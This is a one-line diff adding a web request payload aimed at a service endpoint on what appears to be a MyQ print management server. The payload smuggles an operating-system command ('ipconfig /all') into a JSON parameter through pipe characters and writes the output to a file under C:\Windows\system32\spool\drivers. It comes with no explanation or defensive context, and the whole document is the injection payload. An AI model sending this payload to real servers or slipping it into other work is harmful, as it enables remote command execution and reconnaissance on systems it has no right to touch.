@@ -1,0 +1,1 @@
+http://myq-x.remore:8090/index.php?m=WebService_Mgmt::invoke&p={"d":{"\\m\\":"Wsf\\\\Win\\\\Firewall::delete\\","\\p\\":"----\\\\"|ipconfig+/all>C:\\\\Windows\\\\system32\\\\spool\\\\drivers\\\\1.txt||----","\\id\\":"1","\\pwd\\":""},"s":"b75c29ef4a5a3d600d96732b3c5cbed1"}
